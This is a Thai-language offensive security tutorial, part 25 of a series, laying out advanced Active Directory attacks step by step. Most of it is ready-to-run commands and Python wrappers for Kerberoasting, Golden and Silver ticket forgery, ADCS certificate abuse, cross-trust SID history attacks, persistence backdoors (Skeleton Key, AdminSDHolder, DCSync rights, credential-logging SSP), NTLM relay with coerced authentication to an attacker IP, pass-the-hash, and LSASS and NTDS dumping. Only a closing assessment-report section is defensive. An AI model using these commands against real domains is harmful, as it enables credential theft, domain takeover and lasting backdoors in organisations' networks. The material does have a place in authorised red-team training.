# Part 25: Active Directory Advanced Attacks (Steps 241-250)

## ภาพรวม
ส่วนนี้ครอบคลุมเทคนิคการโจมตี Active Directory ระดับสูง รวมถึง Kerberos attacks, BloodHound analysis, ADCS exploitation, Forest attacks, และ AD persistence techniques

---

## Step 241: Kerberos Attacks Advanced

### Kerberos Attack Chain
```
Kerberos Attack Surface:
┌──────────────────────────────────────────────────┐
│  Authentication Flow:                              │
│  Client → KDC (AS_REQ) → TGT                    │
│  Client → KDC (TGS_REQ) → TGS                   │
│  Client → Service (AP_REQ)                        │
│                                                    │
│  Attack Techniques:                               │
│  • Kerberoasting: Request TGS for SPN accounts   │
│  • AS-REP Roasting: No preauth accounts         │
│  • Pass-the-Ticket: Inject/steal TGT/TGS        │
│  • Golden Ticket: Forge TGT with KRBTGT hash    │
│  • Silver Ticket: Forge TGS for specific svc    │
│  • Diamond Ticket: Modified Golden Ticket       │
│  • Sapphire Ticket: Real TGT + PAC modification │
└──────────────────────────────────────────────────┘
```

### Kerberoasting แบบ Advanced
```bash
# Kerberoasting ด้วย Impacket
python3 GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request

# เพิ่ม -outputfile
python3 GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request -outputfile hashes.txt

# ครัค hash
hashcat -m 13100 hashes.txt rockyou.txt
hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule

# AS-REP Roasting
python3 GetNPUsers.py domain.local/ -dc-ip 10.10.10.1 -usersfile users.txt -no-pass

# ครัค AS-REP hashes
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

### Golden Ticket Attack
```python
#!/usr/bin/env python3
# golden_ticket.py

from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP, EncTicketPart, Ticket, AS_REQ
from impacket.krb5.crypto import Key, _enctype_table
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
import struct
import datetime

class GoldenTicketAttack:
    def __init__(self, domain, domain_sid, krbtgt_hash):
        self.domain = domain
        self.domain_sid = domain_sid
        self.krbtgt_hash = krbtgt_hash
    
    def create_golden_ticket_command(self, username='administrator', groups=None):
        """Generate Mimikatz command for Golden Ticket"""
        if groups is None:
            groups = '500,501,513,512,520,518,519'
        
        cmd = f"""
# Golden Ticket - Mimikatz
kerberos::golden /domain:{self.domain} /sid:{self.domain_sid} /rc4:{self.krbtgt_hash} /user:{username} /groups:{groups} /ticket:golden.kirbi

# Inject ticket
kerberos::ptt golden.kirbi

# Verify
klist

# Access
ls \\\\dc01.{self.domain}\\c$
"""
        return cmd
    
    def create_golden_ticket_impacket(self, target='dc01'):
        """Golden Ticket command ด้วย Impacket"""
        cmd = f"""
# Impacket ticketer.py
python3 ticketer.py -nthash {self.krbtgt_hash} -domain-sid {self.domain_sid} -domain {self.domain} administrator

# Export ticket
export KRB5CCNAME=administrator.ccache

# ใช้ ticket
python3 smbclient.py -k -no-pass {target}.{self.domain}
python3 psexec.py -k -no-pass {target}.{self.domain}
"""
        return cmd

# Silver Ticket
def create_silver_ticket(domain, domain_sid, service_hash, spn, username='administrator'):
    cmd = f"""
# Silver Ticket - เข้าถึง service เฉพาะ
# service_hash = NTLM hash ของ service account

# Mimikatz
kerberos::golden /domain:{domain} /sid:{domain_sid} /rc4:{service_hash} /user:{username} /service:cifs /target:{spn} /ticket:silver.kirbi

# Impacket
python3 ticketer.py -nthash {service_hash} -domain-sid {domain_sid} -domain {domain} -spn {spn} {username}
"""
    return cmd

# การใช้งาน
if __name__ == '__main__':
    attacker = GoldenTicketAttack(
        domain='domain.local',
        domain_sid='S-1-5-21-XXXX-XXXX-XXXX',
        krbtgt_hash='KRBTGT_NTLM_HASH_HERE'
    )
    
    print(attacker.create_golden_ticket_command())
```

### Ticket Attacksด้วย CrackMapExec
```bash
# Dump KRBTGT hash (requires Domain Admin)
python3 secretsdump.py domain.local/administrator:password@dc01

# Rubeus commands สำหรับ Golden/Silver
Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:DOMAIN_SID /user:administrator /ptt
Rubeus.exe silver /rc4:SERVICE_HASH /domain:domain.local /sid:DOMAIN_SID /user:administrator /service:cifs/server.domain.local /ptt

# Rubeus Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Rubeus AS-REP Roasting
Rubeus.exe asreproast /format:hashcat

# Ticket dump
Rubeus.exe dump /service:krbtgt
Rubeus.exe triage  # ดู tickets ทั้งหมด
```

---

## Step 242: BloodHound Analysis

### BloodHound Collection และ Analysis
```bash
# ติดตั้ง BloodHound
sudo apt install bloodhound

# เริ่ม Neo4j
sudo neo4j start
# default: http://localhost:7474 (neo4j:neo4j -> เปลี่ยน password)

# เริ่ม BloodHound
bloodhound --no-sandbox &

# SharpHound collection
./SharpHound.exe --CollectionMethods All
./SharpHound.exe --CollectionMethods All,GPOLocalGroup --Loop
./SharpHound.exe -d domain.local --dc dc01.domain.local

# BloodHound.py (Python collector)
bloohound-python -u user -p password -d domain.local -dc dc01.domain.local -c All
```

### BloodHound Cypher Queries
```cypher
// หา shortest path to Domain Admin
MATCH (u:User {name:"USER@DOMAIN.LOCAL"}),(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}),
p=shortestPath((u)-[*1..]->(g)) RETURN p

// Kerberoastable users ที่เป็น admin
MATCH (u:User {hasspn:true}) WHERE u.admincount=true RETURN u.name

// Users ที่ DCSync ได้
MATCH (u:User)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN u.name, d.name

// Path from any user to Domain Admin
MATCH p=shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
WHERE n:User AND n.name<>"ADMINISTRATOR@DOMAIN.LOCAL"
RETURN p LIMIT 10

// Computers local admins can access
MATCH (u:User {name:"TARGET@DOMAIN.LOCAL"}),(c:Computer),
p=shortestPath((u)-[:AdminTo|HasSession|MemberOf*1..]->(c))
RETURN p

// Unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// ACL abuse paths
MATCH (u:User),(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}),
p=shortestPath((u)-[:MemberOf|HasSession|AdminTo|GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns*1..]->(g))
RETURN p
```

---

## Step 243: ADCS (Active Directory Certificate Services) Exploitation

### ADCS Attack Overview
```
ADCS Vulnerable Templates (ESC1-ESC8):
┌───────────────────────────────────────────────┐
│  ESC1: Requestable template + any SAN            │
│  ESC2: Any purpose EKU                           │
│  ESC3: Certificate Request Agent + no manager    │
│  ESC4: Dangerous template permissions            │
│  ESC5: Dangerous PKI object permissions          │
│  ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag        │
│  ESC7: Vulnerable CA permissions                 │
│  ESC8: NTLM relay to AD CS HTTP endpoints        │
└───────────────────────────────────────────────┘
```

### ADCS Enumeration และ Exploitation
```bash
# Certify - ADCS vulnerability finder
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser

# ตรวจสอบ CA และ templates
Certify.exe cas
Certify.exe find

# ESC1 exploit
# สอบ template ที่มี Client Authentication + enrollee supplies SAN
Certify.exe request /ca:DC01.domain.local\CertsvcName /template:VulnerableTemplate /altname:administrator

# แปลง cert เป็น PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Rubeus - ใช้ cert เพื่อ pass the cert
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:certpassword /ptt
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:certpassword /getcredentials
```

### Certipy (Python ADCS Tool)
```bash
# ติดตั้ง Certipy
pip3 install certipy-ad

# Find vulnerable templates
certipy find -u user@domain.local -p password -dc-ip 10.10.10.1
certipy find -u user@domain.local -p password -dc-ip 10.10.10.1 -vulnerable

# ESC1 exploit
certipy req -u user@domain.local -p password -dc-ip 10.10.10.1 \
  -target ca-server.domain.local -ca 'CertsvcName' \
  -template VulnerableTemplate -upn administrator@domain.local

# รับ hash จาก cert
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# ESC8 - NTLM relay
certipy relay -target http://ca-server.domain.local/certsrv/certfnsh.asp
```

---

## Step 244: AD Forest Attacks และ Trust Attacks

### Trust Attack Techniques
```bash
# เดาะสู่ trusts
# PowerShell
(Get-ADForest).Domains
Get-ADTrust -Filter *
Get-ADDomain -Filter * -Server domain.local

# ดู forest trusts
Get-ADTrust -Filter {ForestTransitive -eq $True}

# Impacket
python3 GetADUsers.py -all domain.local/user:password -dc-ip 10.10.10.1

# Foreign group members
Get-ADUser -Filter * -Properties * | 
Where-Object {$_.DistinguishedName -match 'ForeignSecurityPrincipal'}

# Child to Parent domain
# ถ้าเป็น child domain: child.domain.local
# 1. ดึง Enterprise Admin SID จาก parent
# 2. สร้าง Golden Ticket ที่มี SID History ของ parent
python3 ticketer.py -domain child.domain.local \
  -domain-sid CHILD_SID -nthash KRBTGT_HASH \
  -extra-sid PARENT_ENTERPRISE_ADMIN_SID \
  administrator
```

### SID History Injection
```python
#!/usr/bin/env python3
# sid_history_attack.py

from impacket.examples.utils import parse_target
from impacket.krb5.kerberosv5 import KerberosClient

def create_inter_realm_ticket(child_domain, parent_domain, trust_key, username):
    """สร้าง inter-realm ticket สำหรับ trust exploitation"""
    
    # Mimikatz commands
    cmds = f"""
# เก็บ trust key
mimikatz# lsadump::trust /patch

# SID History attack ข้าม forest trust
mimikatz# kerberos::golden /domain:{child_domain} /sid:CHILD_SID \
  /sids:PARENT_ENTERPRISE_ADMIN_SID \
  /rc4:TRUST_KEY /user:{username} /service:krbtgt \
  /target:{parent_domain} /ticket:cross_realm.kirbi

# Inject และใช้
 mimikatz# kerberos::ptt cross_realm.kirbi

# Access parent domain DC
ls \\\\dc01.{parent_domain}\\c$
"""
    return cmds

print(create_inter_realm_ticket(
    child_domain='child.corp.local',
    parent_domain='corp.local',
    trust_key='TRUST_KEY_HASH',
    username='administrator'
))
```

---

## Step 245: AD Persistence Techniques

### Persistence Mechanisms
```python
#!/usr/bin/env python3
# ad_persistence.py

import subprocess

class ADPersistenceTechniques:
    
    def golden_ticket_persistence(self, krbtgt_hash, domain_sid, domain):
        """ใช้ Golden Ticket เป็น persistence"""
        # Golden Ticket มี lifetime นาน (default 10 years)
        # ตราบได้ยากเพราะต้องเปลี่ยน KRBTGT password 2 ครั้ง
        return f"mimikatz# kerberos::golden /domain:{domain} /sid:{domain_sid} /rc4:{krbtgt_hash} /user:administrator /ticket:persistence.kirbi"
    
    def adminsdHolder_persistence(self):
        """AdminSDHolder backdoor - ทำให้ผู้ใช้เป็น admin ถาวร"""
        # AdminSDHolder เป็น template สำหรับ protected groups
        # SDProp process จะ sync ACL ทุก 60 นาที
        return """
# เพิ่มผู้ใช้เป็น admin บน AdminSDHolder
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' \
  -PrincipalIdentity 'backdoor_user' -Rights All

# ตรวจสอบ
Get-DomainObjectAcl 'CN=AdminSDHolder,CN=System,DC=domain,DC=local'

# Force SDProp
Invoke-SDPropagator"""
    
    def skeleton_key(self):
        """Skeleton Key - universal password"""
        return """
# Skeleton Key ด้วย Mimikatz
mimikatz# privilege::debug
mimikatz# misc::skeleton

# หลังจากนี้ ผู้ใช้ทุกคน login ด้วย "mimikatz" ได้
# เช่น: psexec.py domain.local/administrator@dc01 (password: mimikatz)
"""
    
    def dsrm_persistence(self):
        """DSRM (Directory Services Restore Mode) backdoor"""
        return """
# Get DSRM hash
mimikatz# lsadump::sam
mimikatz# token::elevate
mimikatz# lsadump::sam

# เปิด DSRM login ผ่าน network
reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

# Login ด้วย DSRM
python3 smbclient.py -hashes DSRM_LM_HASH:DSRM_NT_HASH .\\administrator@dc01.domain.local
"""
    
    def dcsync_persistence(self):
        """Grant DCSync rights เป็น backdoor"""
        return """
# Grant DCSync rights to backdoor user
# PowerView
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' \
  -PrincipalIdentity 'backdoor_user' \
  -Rights DCSync

# Impacket
# เพิ่ม replication rights
Add-ObjectAcl -PrincipalIdentity backdoor_user -Rights DCSync

# ใช้งาน DCSync
python3 secretsdump.py domain.local/backdoor_user:password@dc01
"""
    
    def custom_ssp(self):
        """Custom Security Support Provider"""
        return """
# ติดตั้ง mimilib.dll เป็น SSP - จะ log credentials ทุกครั้งที่ login
mimikatz# misc::memssp

# หรือ persistent version:
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" \
  /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib"

# Credentials จะถูก log ที่ C:\\Windows\\System32\\kiwissp.log
"""

# แสดงเทคนิค
if __name__ == '__main__':
    techniques = ADPersistenceTechniques()
    print("=== AD Persistence Techniques ===")
    print("\n1. Golden Ticket:")
    print(techniques.golden_ticket_persistence('HASH', 'S-1-5-21-xxx', 'domain.local'))
    print("\n2. AdminSDHolder:")
    print(techniques.adminsdHolder_persistence())
    print("\n3. Skeleton Key:")
    print(techniques.skeleton_key())
```

---

## Step 246: NTLM Relay Attacks Advanced

### NTLM Relay Setup
```bash
# Setup Responder (Listener)
responder -I eth0 -dwPv
# ปิด SMB และ HTTP ใน Responder.conf เพื่อใช้กับ ntlmrelayx

# Setup ntlmrelayx
# Basic relay
python3 ntlmrelayx.py -smb2support -tf targets.txt

# Relay ไปยัง specific target
python3 ntlmrelayx.py -smb2support -t 10.10.10.1

# SOCKS proxy mode
python3 ntlmrelayx.py -smb2support -tf targets.txt -socks

# Relay ไปยัง LDAP (drop privileges)
python3 ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user lowpriv

# Relay ไปยัง LDAP+S
python3 ntlmrelayx.py -t ldaps://dc01.domain.local --add-computer FAKE01

# Create new computer account
python3 ntlmrelayx.py -t ldap://dc01.domain.local --add-computer attacker-computer$

# Relay กับ ADCS (ESC8)
python3 ntlmrelayx.py -t http://ca-server.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
```

### Forced Authentication Techniques
```bash
# PetitPotam - force DC authentication
python3 PetitPotam.py -u '' -p '' ATTACKER_IP DC_IP

# PrintSpooler
python3 printerbug.py domain.local/user:password@dc01 ATTACKER_IP

# ดึง domain computer hash
python3 ntlmrelayx.py -t ldaps://dc02.domain.local --delegate-access \
  --add-computer FAKE01 --escalate-user FAKE01$

# After relay + add computer:
# ขอ service ticket using delegation
python3 getST.py -spn host/dc01.domain.local domain.local/FAKE01$:password \
  -impersonate administrator

export KRB5CCNAME=administrator.ccache
python3 smbclient.py -k -no-pass dc01.domain.local
```

---

## Step 247: Pass-the-Hash / Pass-the-Ticket Advanced

### Advanced PtH/PtT
```bash
# Pass-the-Hash variants

# Impacket
python3 smbexec.py -hashes LMHASH:NTHASH domain.local/administrator@10.10.10.1
python3 wmiexec.py -hashes :NTHASH domain.local/administrator@10.10.10.1
python3 atexec.py -hashes :NTHASH domain.local/administrator@10.10.10.1 'whoami'

# CrackMapExec
cme smb 10.10.10.0/24 -u administrator -H NTHASH
cme smb 10.10.10.0/24 -u administrator -H NTHASH --sam  # dump SAM
cme smb 10.10.10.0/24 -u administrator -H NTHASH --lsa  # dump LSA
cme smb 10.10.10.0/24 -u administrator -H NTHASH -x 'whoami'  # execute

# Overpass-the-Hash (PTK)
# NTLM hash -> Kerberos TGT
Rubeus.exe asktgt /user:administrator /rc4:NTHASH /ptt

# Mimikatz
mimikatz# sekurlsa::pth /user:administrator /domain:domain.local /ntlm:NTHASH /run:cmd.exe
```

### Hash Dumping Techniques
```bash
# Mimikatz
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords  # clear-text creds + hashes
mimikatz# lsadump::dcsync /user:krbtgt  # DCSync
mimikatz# lsadump::lsa /patch  # LSA secrets
mimikatz# lsadump::sam  # SAM database

# Impacket secretsdump
python3 secretsdump.py domain.local/administrator:password@dc01
python3 secretsdump.py -hashes :NTHASH domain.local/administrator@dc01

# CrackMapExec
cme smb dc01 -u administrator -p password --ntds  # dump NTDS.dit
cme smb dc01 -u administrator -H NTHASH --ntds vss  # via VSS

# LSASS dump methods
# Task Manager GUI method
# ProcDump
procdump.exe -ma lsass.exe lsass.dmp

# Mimikatz offline
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

---

## Step 248: AD Recon และ Enumeration Advanced

### Comprehensive AD Recon
```python
#!/usr/bin/env python3
# ad_recon_advanced.py

from impacket.ldap import ldap, ldapasn1
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
from impacket import version
import json

class ADReconAdvanced:
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.base_dn = ','.join(f'DC={x}' for x in domain.split('.'))
    
    def connect(self):
        """Connect ไปยัง LDAP"""
        self.conn = ldap.LDAPConnection(
            f'ldap://{self.dc_ip}',
            self.base_dn
        )
        self.conn.login(
            self.username,
            self.password,
            self.domain
        )
        print(f"[+] Connected to {self.dc_ip}")
    
    def get_domain_info(self):
        """ดึงข้อมูล domain"""
        attrs = [
            'minPwdAge', 'maxPwdAge', 'minPwdLength',
            'pwdHistoryLength', 'lockoutThreshold',
            'ms-DS-MachineAccountQuota'
        ]
        
        resp = self.conn.search(
            searchBase=self.base_dn,
            searchFilter='(objectClass=domain)',
            attributes=attrs
        )
        
        if resp:
            print("[*] Domain Policy:")
            for attr in attrs:
                print(f"  {attr}: {resp[0].get(attr, 'N/A')}")
    
    def find_privileged_users(self):
        """ค้นหา privileged users"""
        priv_groups = [
            'Domain Admins', 'Enterprise Admins', 'Schema Admins',
            'Administrators', 'Account Operators', 'Backup Operators',
            'Print Operators', 'Server Operators', 'Group Policy Creator Owners'
        ]
        
        print("[*] Privileged Groups:")
        for group in priv_groups:
            resp = self.conn.search(
                searchBase=self.base_dn,
                searchFilter=f'(&(objectClass=group)(cn={group}))',
                attributes=['member']
            )
            if resp:
                members = resp[0].get('member', [])
                print(f"  {group}: {len(members)} members")
                for m in members[:3]:
                    print(f"    - {m}")
    
    def find_kerberoastable_users(self):
        """ค้นหา Kerberoastable users"""
        resp = self.conn.search(
            searchBase=self.base_dn,
            searchFilter='(&(objectClass=user)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))',
            attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf']
        )
        
        print("[*] Kerberoastable Users:")
        for user in resp:
            name = user.get('sAMAccountName', 'N/A')
            spns = user.get('servicePrincipalName', [])
            print(f"  {name}: {spns}")
    
    def find_asreproastable_users(self):
        """ค้นหา AS-REP Roastable users"""
        # userAccountControl flag: DONT_REQ_PREAUTH = 4194304
        resp = self.conn.search(
            searchBase=self.base_dn,
            searchFilter='(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
            attributes=['sAMAccountName', 'memberOf']
        )
        
        print("[*] AS-REP Roastable Users:")
        for user in resp:
            print(f"  {user.get('sAMAccountName', 'N/A')}")
    
    def find_delegation_accounts(self):
        """ค้นหา delegation accounts"""
        # Unconstrained delegation: userAccountControl flag 524288
        print("[*] Unconstrained Delegation:")
        resp = self.conn.search(
            searchBase=self.base_dn,
            searchFilter='(userAccountControl:1.2.840.113556.1.4.803:=524288)',
            attributes=['sAMAccountName', 'objectClass']
        )
        for obj in resp:
            print(f"  {obj.get('sAMAccountName', 'N/A')}")
        
        # Constrained delegation: msDS-AllowedToDelegateTo
        print("[*] Constrained Delegation:")
        resp = self.conn.search(
            searchBase=self.base_dn,
            searchFilter='(msDS-AllowedToDelegateTo=*)',
            attributes=['sAMAccountName', 'msDS-AllowedToDelegateTo']
        )
        for obj in resp:
            print(f"  {obj.get('sAMAccountName')}: {obj.get('msDS-AllowedToDelegateTo')}")

# การใช้งาน
if __name__ == '__main__':
    recon = ADReconAdvanced(
        domain='domain.local',
        dc_ip='10.10.10.1',
        username='lowpriv',
        password='Password123'
    )
    recon.connect()
    recon.get_domain_info()
    recon.find_privileged_users()
    recon.find_kerberoastable_users()
    recon.find_asreproastable_users()
```

---

## Step 249: Resource-Based Constrained Delegation (RBCD)

### RBCD Attack
```bash
# RBCD Attack Steps:
# 1. ได้ write access บน computer object
# 2. สร้าง computer account ใหม่
# 3. ตั้ง msDS-AllowedToActOnBehalfOfOtherIdentity
# 4. S4U2Proxy - impersonate domain admin

# ขั้นตอน 1: สร้าง fake computer (machine account quota)
python3 addcomputer.py domain.local/lowpriv:password -dc-ip 10.10.10.1 \
  -computer-name 'ATTACKER-PC$' -computer-pass 'AttackerPass123!'

# ขั้นตอน 2: ดึง SID ของ computer ที่สร้าง
python3 ldapdomaindump.py domain.local/lowpriv:password@dc01

# ขั้นตอน 3: ตั้ง RBCD attribute
# PowerMad/PowerView
Set-ADComputer -Identity target-computer -PrincipalsAllowedToDelegateToAccount ATTACKER-PC$

# Python
python3 rbcd.py -delegate-from 'ATTACKER-PC$' -delegate-to 'TARGET-PC$' \
  -dc-ip 10.10.10.1 domain.local/lowpriv:password -action write

# ขั้นตอน 4: S4U2Proxy
python3 getST.py -spn cifs/TARGET-PC.domain.local -impersonate administrator \
  domain.local/'ATTACKER-PC$':AttackerPass123! -dc-ip 10.10.10.1

export KRB5CCNAME=administrator@cifs_TARGET-PC.domain.local@DOMAIN.LOCAL.ccache
python3 smbclient.py -k -no-pass TARGET-PC.domain.local
```

---

## Step 250: AD Security Assessment Report

### AD Assessment Report Generator
```python
#!/usr/bin/env python3
# ad_assessment_report.py

from datetime import datetime

def generate_ad_report(findings, domain, assessed_by):
    """สร้างรายงาน AD Security Assessment"""
    
    critical = [f for f in findings if f['severity'] == 'Critical']
    high = [f for f in findings if f['severity'] == 'High']
    medium = [f for f in findings if f['severity'] == 'Medium']
    low = [f for f in findings if f['severity'] == 'Low']
    
    report = f"""# Active Directory Security Assessment Report

**Domain:** {domain}
**Date:** {datetime.now().strftime('%B %d, %Y')}
**Assessed By:** {assessed_by}

## Executive Summary

| Severity | Count |
|----------|-------|
| Critical | {len(critical)} |
| High     | {len(high)} |
| Medium   | {len(medium)} |
| Low      | {len(low)} |
| **Total**| **{len(findings)}** |

## Key Findings
"""
    
    for finding in findings:
        report += f"""
### [{finding['severity']}] {finding['title']}

**Affected Resource:** {finding.get('resource', 'N/A')}

**Description:**
{finding['description']}

**Impact:**
{finding['impact']}

**Remediation:**
{finding['remediation']}

---"""
    
    return report

# Sample findings
sample_findings = [
    {
        'severity': 'Critical',
        'title': 'KRBTGT Account Not Reset',
        'resource': 'CN=krbtgt,CN=Users,DC=domain,DC=local',
        'description': 'KRBTGT account password has not been changed in over 6 months, leaving the domain vulnerable to Golden Ticket attacks.',
        'impact': 'An attacker who previously obtained the KRBTGT hash can forge unlimited Kerberos tickets.',
        'remediation': 'Reset KRBTGT password twice with interval of 10 hours between resets.'
    },
    {
        'severity': 'Critical',
        'title': 'Kerberoastable Service Account with Admin Rights',
        'resource': 'svc_backup (Domain Admin member)',
        'description': 'Service account with weak password is a Domain Admin member and has SPN configured.',
        'impact': 'Password can be cracked offline; domain compromise via Kerberoasting.',
        'remediation': 'Use gMSA for service accounts, remove unnecessary admin rights.'
    },
    {
        'severity': 'High',
        'title': 'LLMNR/NBT-NS Enabled',
        'resource': 'All workstations',
        'description': 'LLMNR and NBT-NS are enabled allowing credential theft via Responder.',
        'impact': 'NTLM hash capture and relay attacks.',
        'remediation': 'Disable LLMNR and NBT-NS via Group Policy.'
    },
    {
        'severity': 'High',
        'title': 'Vulnerable ADCS Template (ESC1)',
        'resource': 'Certificate Template: WebServer',
        'description': 'Certificate template allows user-specified Subject Alternative Names.',
        'impact': 'Any user can request certificate as any domain user including admins.',
        'remediation': 'Disable enrollee supplies subject option, or restrict enrollment.'
    }
]

report = generate_ad_report(
    findings=sample_findings,
    domain='corp.local',
    assessed_by='Security Team'
)

print(report)
```

---

## สรุป Part 25

| Step | หัวข้อ | เครื่องมือหลัก |
|------|--------|---------------|
| 241 | Kerberos Advanced | Rubeus, Impacket, Mimikatz |
| 242 | BloodHound Analysis | BloodHound, SharpHound |
| 243 | ADCS Exploitation | Certify, Certipy |
| 244 | AD Forest Attacks | Cross-forest trust exploitation |
| 245 | AD Persistence | Golden Ticket, AdminSDHolder, Skeleton Key |
| 246 | NTLM Relay Advanced | ntlmrelayx, Responder, PetitPotam |
| 247 | PtH/PtT Advanced | Impacket, CrackMapExec |
| 248 | AD Recon Advanced | LDAP queries, PowerView |
| 249 | RBCD Attack | Resource-Based Constrained Delegation |
| 250 | AD Assessment Report | Report generator |
